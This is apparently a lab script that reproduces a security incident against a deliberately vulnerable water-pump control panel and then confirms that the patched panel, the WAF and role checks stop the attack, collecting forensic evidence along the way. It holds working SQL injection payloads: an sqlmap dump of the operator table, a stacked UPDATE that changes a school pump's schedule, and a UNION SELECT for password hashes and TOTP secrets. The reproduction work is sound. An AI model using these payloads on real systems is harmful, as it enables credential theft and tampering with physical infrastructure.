#!/usr/bin/env bash
# Reproducao controlada do INC-VA-0712 em laboratorio (objetivo 5, RT-14).
# SO no ambiente isolado da equipe, contra a PROPRIA instancia, com dados
# sinteticos (Lei 12.737/2012). Passos:
#   1. sobe a versao vulneravel do painel (porta 8081, so loopback);
#   2. ataque: sqlmap extrai a tabela operador (passo 4 do incidente);
#   3. ataque: injecao empilhada altera o agendamento da bomba (passo 4);
#   4. mesmo ataque contra o sistema corrigido (WAF 8080 e painel 8090): falha;
#   5. operador sem permissao tenta comandar a bomba no painel novo: 403;
#   6. coleta as evidencias com SHA-256 + custodia e gera a linha do tempo.
# Pre-requisitos: bash scripts/subir_lab.sh ja rodado; sqlmap instalado.
# Rodar entre 23h e 6h faz as regras de "fora do horario" dispararem no SIEM.
set -euo pipefail
cd "$(dirname "$0")/.."
CASO="${CASO:-INC-VA-0712-repro}"
SAIDA="forense/casos/$CASO/ataque"
mkdir -p "$SAIDA"
COLETOR="${COLETOR:-Perito 1 da equipe}"

echo "[1] subindo o painel vulneravel (lab)"
docker compose --profile vulneravel up -d --build painel-vulneravel
for _ in $(seq 1 30); do curl -fs "http://127.0.0.1:8081/historico?dispositivo=x" >/dev/null && break; sleep 1; done

echo "[2] sqlmap contra o painel vulneravel: enumerar e extrair a tabela operador"
sqlmap -u "http://127.0.0.1:8081/historico?dispositivo=ubs-sensor-1" --batch --dbms=PostgreSQL \
  -D vila -T operador --dump --output-dir="$SAIDA/sqlmap-antes" | tee "$SAIDA/sqlmap_antes.txt"

echo "[3] injecao empilhada: muda o agendamento da bomba da escola para 03:00"
curl -s --get "http://127.0.0.1:8081/historico" \
  --data-urlencode "dispositivo=x'; UPDATE vila.agendamento_bomba SET horario='03:00', atualizado_em=now() WHERE bomba='escola-bomba'; SELECT now(),'x','x','x','x' --" \
  | tee "$SAIDA/stacked_update.json"; echo
docker compose exec -T postgres psql -U vila_owner -d vila -c \
  "SELECT bomba, horario, atualizado_em FROM vila.agendamento_bomba" | tee "$SAIDA/agendamento_depois.txt"

echo "[4] mesmo ataque contra o sistema corrigido"
echo "  4a. direto no painel corrigido (sem WAF, porta 8090): causa raiz corrigida"
COOKIE="$(python3 scripts/demo_painel.py sessao bruno --url http://127.0.0.1:8090)"
sqlmap -u "http://127.0.0.1:8090/historico?dispositivo=ubs-sensor-1" --batch --dbms=PostgreSQL \
  --cookie="$COOKIE" --level=3 --risk=2 --flush-session --output-dir="$SAIDA/sqlmap-depois" | tee "$SAIDA/sqlmap_depois_sem_waf.txt" || true
echo "  4b. pelo WAF (porta 8080): camada adicional"
curl -s -o /dev/null -w "WAF respondeu HTTP %{http_code}\n" --get "http://127.0.0.1:8080/historico" \
  --data-urlencode "dispositivo=x' UNION SELECT login,senha_hash,salt,totp_secret,perfil FROM operador--" \
  | tee "$SAIDA/waf_bloqueio.txt"
curl -s -o /dev/null -w "painel corrigido (8090) respondeu HTTP %{http_code} para entrada invalida\n" --get \
  "http://127.0.0.1:8090/historico" --data-urlencode "dispositivo=x' OR '1'='1" | tee -a "$SAIDA/waf_bloqueio.txt"

echo "[5] operador sem permissao tenta desligar a bomba no painel novo"
python3 scripts/demo_painel.py rbac | tee "$SAIDA/rbac.txt"

echo "[6] coleta das evidencias + custodia + linha do tempo"
python3 forense/coletar_evidencia.py coletar --caso "$CASO" --coletor "$COLETOR" \
  logs/painel_legado.json logs/painel.json logs/postgres/postgresql.log logs/mosquitto.log \
  $(ls logs/vpn.json logs/atuador.json logs/waf_audit.json 2>/dev/null)
python3 forense/coletar_evidencia.py verificar --caso "$CASO"
python3 forense/consolidar_timeline.py --caso "$CASO"
docker compose --profile vulneravel stop painel-vulneravel
echo "Pronto. Evidencias e linha do tempo em forense/casos/$CASO/"
